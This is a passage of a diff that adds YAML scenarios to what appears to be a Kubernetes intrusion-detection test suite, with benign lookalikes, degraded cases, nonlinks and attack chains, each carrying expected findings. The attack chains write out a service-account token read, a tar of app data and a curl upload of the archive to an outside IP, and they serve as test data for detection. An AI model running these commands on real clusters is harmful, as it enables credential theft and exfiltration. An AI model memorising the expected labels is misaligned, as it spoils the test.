+        reference: "section 8: K8NTEXT human-user actions (secrets)"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Bulk secret access recorded but by operator within normal baseline"
+    roles:
+      - name: operator_user
+        kind: operator
+    steps:
+      - step: 1
+        action: secret_list
+        params:
+          principal: operator_user
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: H3
+            state: ABSENT
+            reason: "Bulk secret enumeration by operator within baseline"
+          - finding: B1
+            state: ABSENT
+            reason: "Benign reads by a baselined principal; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: h3_secret_enumeration_audit_gap
+    kind: degraded
+    title: "H3 unobservable: secret enumeration but audit events missing"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "audit feed gap"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Attacker enumerates secrets but audit events not recorded"
+    observability: "AUD-POLICY-EFFECTIVE gap during enumeration window"
+    roles:
+      - name: attacker_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: secret_list
+        unobserved: [audit]
+        params:
+          principal: attacker_sa
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: H3
+            state: UNOBSERVABLE
+            reason: "Secret enumeration but audit feed gap prevents observation"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== H4: Lookalikes and Degraded ==========
+
+  - id: h4_benign_read_connect
+    kind: lookalike
+    title: "H4 lookalike: Legitimate sensitive read + external connect (backup)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "backup job reading and transferring data"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Sensitive file read and external connection but for legitimate backup"
+    roles:
+      - name: backup_job
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: backup_job
+          executable: /usr/local/bin/backup-dump
+          argv: [backup-dump, --config]
+        outcome: success
+      - step: 2
+        action: read_sensitive_file
+        params:
+          reader_process: "@step1.process"
+          file_path: /etc/passwd    # tagged by the C_H4 path list
+        outcome: success
+        # No H4 opportunity on the read: an H4 firing cites the read, and an
+        # UNOBSERVABLE label here would absorb it (score.py: UNOBSERVABLE
+        # before ABSENT), hiding the false alarm the upload (step 8) measures.
+        expects: []
+      - step: 3
+        action: process_exec
+        incident: other     # a sibling's unrelated connect (B1)
+        params:
+          parent_process: backup_job
+          executable: /usr/bin/scp
+          argv: [scp, backup.tar, "backup@203.0.113.200:/srv"]
+        outcome: success
+      - step: 4
+        action: connect_external
+        incident: other     # a sibling's unrelated connect (B1)
+        params:
+          source_pod: backup_job
+          source_process: "@step3.process"
+          remote_ip: 203.0.113.200
+          remote_port: 22
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "First connection from the workload to this external destination"
+          - finding: H4
+            state: ABSENT
+            reason: "Read + connect but for legitimate backup job"
+      - step: 5
+        action: process_exec
+        float: upload
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/bin/rsync
+          argv: [rsync, -a, /backup/staging/, "backup.example.com::backups"]
+        outcome: success
+      - step: 6
+        action: file_write
+        float: upload
+        params:
+          writer_process: "@step5.process"
+          file_path: /backup/staging/backup.part
+        outcome: success
+        expects: []
+      - step: 7
+        action: connect_external
+        float: upload
+        params:
+          source_pod: backup_job
+          source_process: "@step5.process"
+          remote_ip: 203.0.113.77
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 8
+        action: egress_transfer
+        float: upload
+        params:
+          source_pod: backup_job
+          source_process: "@step5.process"
+          destination: 203.0.113.77
+          bytes_out: 4096
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H4
+            state: ABSENT
+            reason: >-
+              Legitimate backup upload: sensitive read + external transfer in one
+              lineage, which H4 cannot tell from exfiltration (design-spec, H4
+              scoping); a firing here is a measured false alarm
+    links:
+      - from: 2
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "reader and connector are sibling processes in the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "rsync, which writes the staging file, is a child of the backup tool"
+      - from: 2
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        gap_s: [0.001, 2]
+        reason: "the reader (the backup tool) is the writer's parent"
+      - from: 1
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "rsync, which uploads, is a child of the backup tool"
+      - from: 2
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        gap_of: [2, 4]
+        reason: "the reader (the backup tool) is the uploader's parent"
+      - from: 7
+        to: 8
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: h4_read_without_connect
+    kind: degraded
+    title: "H4 unobservable: sensitive file read but external connection not observed"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "missing network observation"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Attacker reads sensitive file but external connection not captured"
+    observability: "NETWORK_FLOW gap during exfiltration window"
+    roles:
+      - name: attacker
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: attacker
+          shell_binary: /bin/sh
+          command: "sh -i"
+        outcome: success
+      - step: 2
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/cat
+          argv: [cat, /etc/passwd]
+        outcome: success
+      - step: 3
+        action: read_sensitive_file
+        params:
+          reader_process: "@step2.process"
+        outcome: success
+        expects:
+          - finding: H4
+            state: UNOBSERVABLE
+      - step: 4
+        action: connect_external
+        unobserved:
+          - ebpf
+        params:
+          source_pod: attacker
+          source_process: "@step1.process"
+          remote_ip: 198.51.100.66
+          remote_port: 443
+        outcome: success
+        expects:
+          - finding: H2
+            state: UNOBSERVABLE
+            reason: "Connect lost in the network gap"
+          - finding: H4
+            state: UNOBSERVABLE
+            reason: "Sensitive read + connect but external connection not observed (network gap)"
+      - step: 5
+        action: read_sensitive_file
+        benign: true
+        float: decoy
+        params:
+          reader_process: attacker
+          file_path: /app/config/application.yaml
+          data_class: application
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "cat, which reads the file, is a child of the shell"
+      - from: 1
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the connect is lost in an eBPF gap"
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 3]
+        reason: "twin: the Pod's own app process (the shell's parent, not its descendant) reads its config"
+        shared_keys: [pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== Hard Nonlinks (shared keys but no witness) ==========
+
+  - id: nonlink_shared_pod_no_witness
+    kind: nonlink
+    title: "Nonlink: Two unrelated actions in same Pod, no REQUEST_IDENTITY link"
+    source:
+      class: benign
+      citation:
+        source: "false positive control"
+        reference: "shared Pod without instance witness"
+    author: "claude (automated draft, task p1-06)"
+    window_s: 120
+    adaptation_note: "Two sibling processes in one Pod: a worker writes a file, a reporter connects to the cluster database, a baselined edge (revised 2026-10-20: a random target Pod made G1a fire on the benign connect)"
+    roles:
+      - name: pod_a
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: pod_a
+          executable: /app/worker
+          argv: [/app/worker, --batch]
+        outcome: success
+        expects: []
+      - step: 2
+        action: file_write
+        params:
+          writer_process: "@step1.process"
+          file_path: /app/data/batch.out
+        outcome: success
+        expects: []
+      - step: 3
+        action: process_exec
+        incident: other     # an unrelated second activity (B1)
+        float: report
+        params:
+          parent_process: pod_a
+          executable: /app/reporter
+          argv: [/app/reporter]
+        outcome: success
+        expects: []
+      - step: 4
+        action: connect_internal
+        incident: other     # an unrelated second activity (B1)
+        float: report
+        params:
+          source_pod: pod_a
+          source_process: "@step3.process"
+          target_service_or_pod: database
+          target_port: 5432
+          protocol: tcp
+        outcome: success
+        expects: []
+    links:
+      - from: 2
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_s: [20, 100]
+        reason: "two sibling processes of one Pod: same Pod and lineage, no ancestry"
+        shared_keys: [pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: nonlink_shared_ip_no_witness
+    kind: nonlink
+    title: "Nonlink: two Pods reach the same external IP on separate flows, no witness"
+    source:
+      class: benign
+      citation:
+        source: "false positive control"
+        reference: "shared remote IP without a common flow"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Two Pods connect to the same external service within seconds; each on its own flow, and Pod B sends bytes on its own (revised 2026-10-20: the Pod IP reuse version rendered no events; link-twin-decoys plan: the nonlink is connect to transfer, so its endpoint kinds match the flow links)"
+    roles:
+      - name: pod_a
+        kind: internal_pod
+      - name: pod_b
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: connect_external
+        incident: other     # an unrelated second activity (B1)
+        params:
+          source_pod: pod_a
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 2
+        action: connect_external
+        params:
+          source_pod: pod_b
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        follows_within_s: 10
+        outcome: success
+        expects: []
+      - step: 3
+        action: egress_transfer
+        params:
+          source_pod: pod_b
+          source_process: pod_b
+          destination: 203.0.113.10
+          bytes_out: 20480
+          protocol: tcp
+        follows_within_s: 10
+        outcome: success
+        expects: []
+    links:
+      - from: 1
+        to: 3
+        witness: NETWORK_FLOW
+        expected: ABSENT
+        reason: "same-socket continuity absent: Pod A's connect and Pod B's transfer reach the same external service on separate flows"
+        shared_keys: [remote_ip]
+      - from: 2
+        to: 3
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: Pod B's bytes are counted on its own connect's flow"
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: nonlink_shared_principal_no_witness
+    kind: nonlink
+    title: "Nonlink: Same principal, two unrelated actions, no CONTROL_PLANE_CAUSALITY"
+    source:
+      class: external
+      citation:
+        source: "false positive control"
+        reference: "principal with multiple independent actions"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Same ServiceAccount performs two unrelated API calls; no causal relationship"
+    roles:
+      - name: service_account
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: service_account
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Benign reads by a baselined principal; not resource enumeration"
+      - step: 2
+        action: api_request
+        incident: other     # an unrelated second activity (B1)
+        params:
+          principal: service_account
+          verb: get
+          api_group: ""
+          resource: secrets
+          namespace: "kube-system"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Benign reads by a baselined principal; not resource enumeration"
+    links:
+      - from: 1
+        to: 2
+        witness: CONTROL_PLANE_CAUSALITY_INSTANCE
+        expected: ABSENT
+        shared_keys: [principal]
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: nonlink_close_timestamp_no_witness
+    kind: nonlink
+    title: "Nonlink: Two events with close timestamps but different processes"
+    source:
+      class: external
+      citation:
+        source: "false positive control"
+        reference: "temporal proximity without process ancestry"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Two unrelated syscalls close in time from sibling processes of one Pod; no ancestry (revised 2026-10-20: two Pods made the Pod alone give the label away)"
+    roles:
+      - name: pod_a
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: pod_a
+          executable: /app/indexer
+          argv: [/app/indexer]
+        outcome: success
+      - step: 2
+        action: read_sensitive_file
+        params:
+          reader_process: "@step1.process"
+          file_path: /app/data/index.db   # not on the C_H4 path list: no H4 join with the Pod's egress
+        outcome: success
+        expects: []
+      - step: 3
+        action: process_exec
+        incident: other     # an unrelated second activity (B1)
+        float: writer
+        params:
+          parent_process: pod_a
+          executable: /app/log-writer
+          argv: [/app/log-writer]
+        outcome: success
+      - step: 4
+        action: file_write
+        incident: other     # an unrelated second activity (B1)
+        float: writer
+        params:
+          writer_process: "@step3.process"
+          file_path: /tmp/file.txt
+        outcome: success
+        expects: []
+    links:
+      - from: 2
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_s: [0.001, 2]
+        reason: "two sibling processes of one Pod within two seconds of each other: no ancestry"
+        shared_keys: [time, pod_uid, lineage_id]
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== Additional Benign Workloads and Administrative Actions ==========
+
+  - id: admin_kubectl_exec_debug
+    kind: admin
+    title: "Admin: kubectl exec for container debugging"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: K8NTEXT human-user actions (pods/exec)"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Administrator uses kubectl exec to debug container issues"
+    roles:
+      - name: admin_user
+        kind: operator
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          source_principal: admin_user
+        outcome: success
+        expects: []
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: admin_backup_job_read_secrets
+    kind: benign_workload
+    title: "Benign: Backup job reading and copying secrets"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "scheduled backup of cluster configuration"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Scheduled job reads secrets and exports them to backup storage"
+    roles:
+      - name: backup_job_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: secret_list
+        params:
+          principal: backup_job_sa
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Backup job reading the secrets it backs up; not resource enumeration"
+      - step: 2
+        action: secret_get
+        params:
+          principal: backup_job_sa
+          namespace: "default"
+          name: "db-password"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Backup job reading the secrets it backs up; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: admin_ci_rbac_mutation
+    kind: admin
+    title: "Admin: CI pipeline mutating RBAC for deployment"
+    source:
+      class: benign
+      citation:
+        source: K8NTEXT
+        reference: "section 8: K8NTEXT human-user actions (RBAC mutations)"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Authorized CI system creates or patches RoleBindings during deployment"
+    roles:
+      - name: ci_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: rbac_change
+        params:
+          principal: ci_sa
+          object_type: RoleBinding
+        outcome: success
+        expects: []
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: admin_image_rollout
+    kind: admin
+    title: "Admin: Image rollout updating Deployment"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "authorized deployment updates"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Administrator or deployment controller updates image in Deployment"
+    roles:
+      - name: admin_or_controller
+        kind: operator
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: admin_or_controller
+          verb: patch
+          api_group: apps
+          resource: deployments
+          name: "my-app"
+        outcome: success
+        expects: []
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: admin_scheduled_job
+    kind: benign_workload
+    title: "Benign: Scheduled batch job (CronJob)"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "scheduled cluster maintenance tasks"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "CronJob runs on schedule to perform maintenance (e.g., cleanup, export)"
+    roles:
+      - name: cronjob_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: cronjob_sa
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Scheduled job's own reads; not resource enumeration"
+      - step: 2
+        action: api_request
+        params:
+          principal: cronjob_sa
+          verb: delete
+          api_group: ""
+          resource: pods
+          namespace: "default"
+          name: "old-pod-to-cleanup"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Scheduled job's own reads; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  - id: admin_operator_list_resources
+    kind: benign_workload
+    title: "Benign: Operator listing cluster resources"
+    source:
+      class: external
+      citation:
+        source: "normal operations"
+        reference: "operator or controller reading cluster state"
+    author: "claude (automated draft, task p1-06)"
+    adaptation_note: "Kubernetes operator lists resources to monitor cluster state"
+    roles:
+      - name: operator_sa
+        kind: service_account
+    steps:
+      - step: 1
+        action: api_request
+        params:
+          principal: operator_sa
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Operator reading cluster state; not resource enumeration"
+      - step: 2
+        action: api_request
+        params:
+          principal: operator_sa
+          verb: watch
+          api_group: ""
+          resource: pods
+          namespace: "default"
+        outcome: success
+        expects:
+          - finding: B1
+            state: ABSENT
+            reason: "Operator reading cluster state; not resource enumeration"
+    links: []
+    variants:
+      - id: v1
+        rulebook_shaped: false
+
+  # ========== Multi-step chains (multistep-chain-plan.md, phase 2b) ==========
+  # Each chain crosses findings and sources, has an instance witness per hop,
+  # and carries benign decoy steps (benign: true) in the same Pod that share
+  # the Pod and lineage but no witness (ABSENT links). Each has a degraded
+  # counterpart that loses one hop's witness in an eBPF gap.
+
+  - id: chain_token_theft_exfil
+    kind: attack
+    title: "Chain: shell, SA token theft, API enumeration with the token, exfiltration"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: "T1609 Container Administration Command; T1528 Steal Application Access Token; T1613 Container and Resource Discovery; T1041 Exfiltration Over C2 Channel"
+        url: "https://attack.mitre.org/matrices/enterprise/containers/"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "A shell in a compromised Pod has cat read the projected SA token, uses it to enumerate the API, and has curl send data out. A sibling health-check process in the same Pod is a decoy."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: replica
+        kind: peer_pod
+        of: compromised_pod
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: compromised_pod
+          shell_binary: /bin/sh
+          command: "sh -c 'read T < /var/run/secrets/kubernetes.io/serviceaccount/token'"
+        outcome: success
+      - step: 3
+        action: read_token_file
+        params:
+          reader_process: "@step1.process"
+          reader_executable: /bin/sh
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: PRESENT
+            reason: "The shell reads the token itself (read builtin), outside the workload's expected readers"
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/healthcheck
+          argv: [/app/healthcheck]
+        outcome: success
+      - step: 5
+        action: api_request
+        params:
+          principal: compromised_pod
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: kube-system
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of kube-system pods outside baseline, with the stolen token"
+      - step: 6
+        action: api_request
+        params:
+          principal: compromised_pod
+          verb: list
+          api_group: ""
+          resource: services
+          namespace: default
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of services exceeds baseline"
+      - step: 7
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/bin/curl
+          argv: [curl, -T, /tmp/out.tgz, "https://198.51.100.23/u"]
+        outcome: success
+      - step: 8
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step4.process"
+          file_path: /app/data/health.out
+        outcome: success
+        expects: []
+      - step: 9
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step7.process"
+          remote_ip: 198.51.100.23
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 10
+        action: egress_transfer
+        params:
+          source_pod: compromised_pod
+          destination: 198.51.100.23
+          bytes_out: 5368709120
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H1
+            state: PRESENT
+            reason: "5 GB egress exceeds baseline"
+      - step: 11
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 198.51.100.61
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The health check connects to a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 14
+        action: process_exec
+        float: stage
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/tar
+          argv: [tar, czf, /tmp/out.tgz, /app/data]
+        outcome: success
+      - step: 15
+        action: file_write
+        float: stage
+        params:
+          writer_process: "@step14.process"
+          file_path: /tmp/out.tgz
+        outcome: success
+        expects: []
+      - step: 16
+        action: connect_external
+        benign: true
+        float: flow_a
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 17
+        action: connect_external
+        benign: true
+        float: flow_b
+        params:
+          source_pod: compromised_pod
+          source_process: compromised_pod
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 18
+        action: egress_transfer
+        benign: true
+        float: flow_e
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          destination: 203.0.113.10
+          bytes_out: 20480
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 12
+        action: read_token_file
+        benign: true
+        float: twin_token
+        params:
+          reader_process: compromised_pod
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects: []
+      - step: 13
+        action: api_request
+        benign: true
+        float: twin_api
+        params:
+          principal: replica
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: replica.namespace
+        outcome: success
+        expects: []
+      - step: 19
+        action: process_exec
+        benign: true
+        float: decoy2
+        params:
+          parent_process: compromised_pod
+          executable: /app/cache-sync
+          argv: [/app/cache-sync]
+        outcome: success
+      - step: 20
+        action: file_write
+        benign: true
+        float: decoy2
+        params:
+          writer_process: "@step19.process"
+          file_path: /app/bin/cache-sync.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 21
+        action: make_executable
+        benign: true
+        float: decoy2
+        params:
+          process: "@step19.process"
+          file_path: /app/bin/cache-sync.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "A sidecar makes its self-update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the shell reads the token"
+      - from: 3
+        to: 5
+        witness: CREDENTIAL_READ_TO_USE
+        expected: UNOBSERVABLE
+        reason: "the token read authenticates the API request, but the read cannot be joined to the token instance (JTI) until CRED-JTI-VERSION-INDEX passes (link-work-remaining-plan.md D-9)"
+      - from: 1
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl is a child of the shell"
+      - from: 1
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl, which connects out, is a child of the shell"
+      - from: 9
+        to: 10
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 1
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 7]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 15]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 21
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 9]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 11
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 9]
+        reason: "twin: a sibling process of the same Pod connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl, which connects out, is a child of the shell that read the token"
+      - from: 3
+        to: 11
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [3, 9]
+        reason: "decoy: the health check, a sibling of the token-reading shell in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 15
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "tar, which writes the archive, is a child of the shell"
+      - from: 16
+        to: 18
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 17
+        to: 18
+        witness: NETWORK_FLOW
+        expected: ABSENT
+        reason: "same-socket continuity absent: another process of the Pod connects to the same remote on its own flow"
+        shared_keys: [remote_ip]
+      - from: 1
+        to: 12
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 3]
+        reason: "twin: the Pod's own app process (the shell's parent, not its descendant) reads the token"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 13
+        witness: CREDENTIAL_READ_TO_USE
+        expected: UNOBSERVABLE
+        reason: "twin: a replica of the same service (same ServiceAccount) calls the API with its own token; not ruled out without the read's token instance (JTI), as for 3 -> 5 (D-9)"
+      - from: 3
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl, which sends the bytes on its flow, is a child of the shell that read the token"
+        ordering: false
+      - from: 11
+        to: 18
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the health check connects out and sends its own bytes, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.shell_binary
+            value: /bin/ash
+          - field: step.3.params.reader_executable
+            value: /bin/ash
+          - field: step.7.params.executable
+            value: /usr/bin/wget
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.shell_binary
+            value: /bin/bash
+          - field: step.3.params.reader_executable
+            value: /bin/bash
+          - field: step.7.params.executable
+            value: /usr/bin/python3
+          - field: step.7.params.argv
+            value: [python3, -c, import urllib.request]
+          - field: step.9.params.remote_ip
+            value: 198.51.100.31
+          - field: step.10.params.destination
+            value: 198.51.100.31
+          - field: step.14.params.executable
+            value: /usr/bin/zip
+          - field: step.15.params.file_path
+            value: /tmp/out.zip
+
+  - id: chain_token_theft_exfil_unobserved
+    kind: degraded
+    title: "Chain degraded: token theft chain with the token read lost in an eBPF gap"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "eBPF probe gap during the credential read"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "chain_token_theft_exfil with step 3 unobserved: D1 and both links that touch the read cannot be confirmed; the rest of the chain is observed."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: shell_exec
+        params:
+          parent_process: compromised_pod
+          shell_binary: /bin/sh
+          command: "sh -c 'read T < /var/run/secrets/kubernetes.io/serviceaccount/token'"
+        outcome: success
+      - step: 3
+        action: read_token_file
+        unobserved:
+          - ebpf
+        params:
+          reader_process: "@step1.process"
+          reader_executable: /bin/sh
+          token_file_path: /var/run/secrets/kubernetes.io/serviceaccount/token
+        outcome: success
+        expects:
+          - finding: D1
+            state: UNOBSERVABLE
+            reason: "Token read lost in an eBPF gap"
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/healthcheck
+          argv: [/app/healthcheck]
+        outcome: success
+      - step: 5
+        action: api_request
+        params:
+          principal: compromised_pod
+          verb: list
+          api_group: ""
+          resource: pods
+          namespace: kube-system
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of kube-system pods outside baseline"
+      - step: 6
+        action: api_request
+        params:
+          principal: compromised_pod
+          verb: list
+          api_group: ""
+          resource: services
+          namespace: default
+        outcome: success
+        expects:
+          - finding: B1
+            state: PRESENT
+            reason: "Enumeration of services exceeds baseline"
+      - step: 7
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /usr/bin/curl
+          argv: [curl, -T, /tmp/out.tgz, "https://198.51.100.23/u"]
+        outcome: success
+      - step: 8
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step4.process"
+          file_path: /app/data/health.out
+        outcome: success
+        expects: []
+      - step: 9
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step7.process"
+          remote_ip: 198.51.100.23
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 10
+        action: egress_transfer
+        params:
+          source_pod: compromised_pod
+          destination: 198.51.100.23
+          bytes_out: 5368709120
+          protocol: tcp
+        outcome: success
